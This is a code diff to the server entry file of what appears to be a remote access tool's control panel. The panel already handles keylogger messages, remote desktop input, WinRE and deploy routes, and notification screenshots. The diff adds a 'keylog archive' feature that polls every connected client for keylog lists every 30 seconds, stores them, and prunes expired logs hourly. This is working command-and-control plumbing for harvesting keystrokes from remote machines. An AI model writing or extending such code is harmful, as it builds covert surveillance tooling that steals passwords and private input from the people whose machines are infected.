@@ -32,6 +32,7 @@ import { handleFileDownloadRoutes } from "./server/routes/file-download-routes";
 import { cleanupFileTransferTempFiles } from "./server/file-transfer-state";
 import { handleClientRoutes } from "./server/routes/client-routes";
 import { handleMiscRoutes } from "./server/routes/misc-routes";
+import { handleKeylogArchiveRoutes } from "./server/routes/keylog-archive-routes";
 import { handleNotificationsConfigRoutes } from "./server/routes/notifications-config-routes";
 import { handlePageRoutes } from "./server/routes/page-routes";
 import { handlePluginRoutes } from "./server/routes/plugin-routes";
@@ -154,6 +155,7 @@ import type { SocketData } from "./sessions/types";
 import { SERVER_VERSION } from "./version";
 import { handleChatViewerOpen, handleChatViewerMessage } from "./server/ws-chat";
 import { handleBuildTagConnection } from "./server/build-tag";
+import { dispatchKeylogArchiveSync, handleKeylogArchiveMessage, pruneExpiredKeylogArchive } from "./server/keylog-archive";
 
 
 metrics.setSnapshotEnricher((snapshot) => {
@@ -636,6 +638,7 @@ async function startServer() {
         logger.warn(`[plugin-autoload] dispatch error for ${info.id}: ${(err as Error).message}`);
       });
     },
+    dispatchKeylogArchiveSync,
     takePendingNotificationScreenshot: takePendingNotificationScreenshotForClient,
     storeNotificationScreenshot: storeNotificationScreenshotForPending,
     handleNotificationScreenshotResult: notificationPluginHandlers.handleNotificationScreenshotResult,
@@ -651,6 +654,7 @@ async function startServer() {
     handleProxyConnectResult,
     handleProcessMessage,
     handleKeyloggerMessage,
+    handleKeylogArchiveMessage,
     notifyRdInputLatency,
     handleNotificationScreenshotFailure: notificationPluginHandlers.handleNotificationScreenshotFailure,
     handlePluginEvent: notificationPluginHandlers.handlePluginEvent,
@@ -712,6 +716,7 @@ async function startServer() {
         (req, url, srv) => handleDeployRoutes(req, url, srv as any, routeDeps.deploy),
         (req, url, srv) => handleWinRERoutes(req, url, srv as any, routeDeps.winre),
         (req, url, srv) => handleFileDownloadRoutes(req, url, srv as any, routeDeps.fileDownload),
+        (req, url) => handleKeylogArchiveRoutes(req, url, { CORS_HEADERS }),
         (req, url) => handlePluginRoutes(req, url, routeDeps.plugin),
         (req, url) => handleFileShareRoutes(req, url, routeDeps.fileShare),
         (req, url, srv) => handleMiscRoutes(req, url, {
@@ -758,6 +763,31 @@ async function startServer() {
     const purged = deleteExpiredChatMessages(retentionMs);
     if (purged > 0) logger.info(`[db] Cleaned up ${purged} expired chat messages (retention: ${chatRetentionDays}d)`);
   }
+
+  const purgedKeylogs = pruneExpiredKeylogArchive();
+  if (purgedKeylogs > 0) logger.info(`[keylog-archive] Cleaned up ${purgedKeylogs} expired archived input logs`);
+  let lastKeylogArchivePollAt = 0;
+  setInterval(() => {
+    const purged = pruneExpiredKeylogArchive();
+    if (purged > 0) logger.info(`[keylog-archive] Cleaned up ${purged} expired archived input logs`);
+  }, 60 * 60 * 1000);
+  setInterval(() => {
+    const cfg = getConfig().inputArchive;
+    if (!cfg?.enabled || cfg.pollIntervalSeconds <= 0) return;
+    const now = Date.now();
+    const intervalMs = cfg.pollIntervalSeconds * 1000;
+    if (now - lastKeylogArchivePollAt < intervalMs) return;
+    lastKeylogArchivePollAt = now;
+
+    let requested = 0;
+    for (const client of clientManager.getAllClients().values()) {
+      if (!client?.id || client.role !== "client" || !client.ws) continue;
+      if (dispatchKeylogArchiveSync(client.id, client.ws)) requested++;
+    }
+    if (requested > 0) {
+      logger.debug(`[keylog-archive] Poll requested keylog lists from ${requested} connected clients`);
+    }
+  }, 30 * 1000);
 
   setInterval(() => {
     const days = getConfig().chat?.retentionDays ?? 30;
